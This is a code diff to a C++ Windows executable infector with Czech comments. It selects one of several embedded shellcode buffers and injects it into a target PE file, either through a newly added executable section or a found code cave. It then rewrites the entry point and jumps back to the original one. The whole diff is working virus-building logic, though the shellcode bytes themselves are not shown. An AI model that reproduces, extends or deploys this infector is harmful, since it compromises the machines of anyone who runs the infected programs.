@@ -17,6 +17,49 @@ PE_file::PE_file(std::filesystem::path path_to_file)
 	}
 }
 
+PE_file::PE_file(std::filesystem::path path_to_file, int i)
+{
+	switch (i)
+	{
+	case 0:
+		strcpy_s(shellcode_used, shellcode);
+		shellcode_size = sizeof(shellcode);
+		break;
+	case 1:
+		strcpy_s(shellcode_used, shellcode1);
+		shellcode_size = sizeof(shellcode1);
+		break;
+	case 2:
+		strcpy_s(shellcode_used, shellcode2);
+		shellcode_size = sizeof(shellcode2);
+		break;
+	case 3:
+		strcpy_s(shellcode_used, shellcode3);
+		shellcode_size = sizeof(shellcode3);
+		break;
+	case 4:
+		strcpy_s(shellcode_used, shellcode4);
+		shellcode_size = sizeof(shellcode4);
+		break;
+	default:
+		strcpy_s(shellcode_used, shellcode);
+		shellcode_size = sizeof(shellcode);
+		break;
+	}
+
+	file_handle = CreateFile(path_to_file.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (!file_handle)
+	{
+		EXIT_FAILURE;
+	}
+	file_size = GetFileSize(file_handle, NULL);
+	if (file_size == 0)
+	{
+		EXIT_FAILURE;
+	}
+}
+
+
 
 std::string PE_file::get_exe_name(const std::filesystem::path& p)
 {
@@ -190,10 +233,10 @@ void PE_file::add_new_section()
 	infected_section->Characteristics ^= IMAGE_SCN_MEM_DISCARDABLE;
 
 	//nastaveni parametru sekce a jejich rozlozeni pro spravne ulozeni do pameti a nasledne na disk pomoci funkce align
-	infected_section->SizeOfRawData = align(size_of_shellcode + sizeof push + sizeof esp + sizeof original_entry_point, nt_header->OptionalHeader.FileAlignment);
+	infected_section->SizeOfRawData = align(shellcode_size + sizeof push + sizeof esp + sizeof original_entry_point, nt_header->OptionalHeader.FileAlignment);
 	infected_section->VirtualAddress = align((last_section_header->VirtualAddress + last_section_header->Misc.VirtualSize), nt_header->OptionalHeader.SectionAlignment);
 	infected_section->PointerToRawData = align((last_section_header->PointerToRawData + last_section_header->SizeOfRawData), nt_header->OptionalHeader.FileAlignment);
-	infected_section->Misc.VirtualSize = align(size_of_shellcode, nt_header->OptionalHeader.SectionAlignment);
+	infected_section->Misc.VirtualSize = align(shellcode_size, nt_header->OptionalHeader.SectionAlignment);
 
 	//zvysime pocet sekci o jednu
 	nt_header->FileHeader.NumberOfSections += 1;
@@ -227,9 +270,9 @@ void PE_file::find_code_cave()
 				code_cave++;
 				code_index = j;
 				//pokud dojde k nalezeni dostatecne velkeho prostoru ukoncime cyklus a ulozime si index na ktery musime skocit pri kopirovani do souboru ulozeneho v pameti
-				if (code_cave == size_of_shellcode_full)
+				if (code_cave == shellcode_size_full)
 				{
-					code_index -= size_of_shellcode_full;
+					code_index -= shellcode_size_full;
 					found_cave = true;
 					break;
 				}
@@ -258,8 +301,8 @@ void PE_file::find_code_cave()
 		signature_verified = false;
 		infected_section = final_section;
 		//
-		//infected_section->Misc.VirtualSize += size_of_shellcode;
-		infected_section->Misc.VirtualSize += size_of_shellcode + 9;
+		//infected_section->Misc.VirtualSize += shellcode_size;
+		infected_section->Misc.VirtualSize += shellcode_size + 9;
 		//nastaveni charakteristik
 		infected_section->Characteristics |= IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
 		//zmena adresy vstupniho bodu souboru
@@ -269,7 +312,7 @@ void PE_file::find_code_cave()
 }
 
 
-void PE_file::infect_into_section(const char* shellcode)
+void PE_file::infect_into_section()
 {
 	if (is_section_new)
 	{
@@ -288,27 +331,27 @@ void PE_file::infect_into_section(const char* shellcode)
 			WriteFile(file_handle, &inject_sec, 1, &bytes_written, NULL);
 		}
 		//vlozime shellcode
-		memcpy(&file_map_view[infected_section->PointerToRawData], shellcode, size_of_shellcode - 1);
+		memcpy(&file_map_view[infected_section->PointerToRawData], shellcode, shellcode_size - 1);
 		//vlozim originalni vstubni bod souboru do zasobniku 
-		memcpy(&file_map_view[infected_section->PointerToRawData + size_of_shellcode - 1], push, sizeof push);
-		memcpy(&file_map_view[infected_section->PointerToRawData + size_of_shellcode + sizeof push - 2], &original_entry_point, sizeof original_entry_point);
+		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_size - 1], push, sizeof push);
+		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_size + sizeof push - 2], &original_entry_point, sizeof original_entry_point);
 		//pote preskocim na danou adresu
-		memcpy(&file_map_view[infected_section->PointerToRawData + size_of_shellcode + sizeof push + sizeof original_entry_point - 2], esp, sizeof esp);
+		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_size + sizeof push + sizeof original_entry_point - 2], esp, sizeof esp);
 	}
 	else
 	{
 		std::cout << "code cave" << std::endl;
 		//vlozime shellcode
-		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index], shellcode, size_of_shellcode - 1);
+		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index], shellcode, shellcode_size - 1);
 		//vlozim originalni vstubni bod souboru do zasobniku
-		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode - 1], push, sizeof push);
-		////memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push - 2], "\xe9", sizeof "\xe9");
-		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push - 2], &original_entry_point, sizeof original_entry_point);
+		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + shellcode_size - 1], push, sizeof push);
+		////memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + shellcode_size + sizeof push - 2], "\xe9", sizeof "\xe9");
+		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + shellcode_size + sizeof push - 2], &original_entry_point, sizeof original_entry_point);
 		////pote preskocim na danou adresu
-		//memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push + sizeof original_entry_point - 2], "\xff\xe0", sizeof "\xff\xe0");
+		//memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + shellcode_size + sizeof push + sizeof original_entry_point - 2], "\xff\xe0", sizeof "\xff\xe0");
 
-		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push + sizeof original_entry_point - 2], esp, sizeof esp);
-		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + size_of_shellcode + sizeof push + sizeof original_entry_point + sizeof esp - 3], "\x11\x11\x11\x11\x11\x11\x11\x11\x11", sizeof "\x11\x11\x11\x11\x11\x11\x11\x11\x11");
+		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + shellcode_size + sizeof push + sizeof original_entry_point - 2], esp, sizeof esp);
+		memcpy(&file_map_view[infected_section->PointerToRawData + shellcode_index + shellcode_size + sizeof push + sizeof original_entry_point + sizeof esp - 3], "\x11\x11\x11\x11\x11\x11\x11\x11\x11", sizeof "\x11\x11\x11\x11\x11\x11\x11\x11\x11");
 
 	}
 }
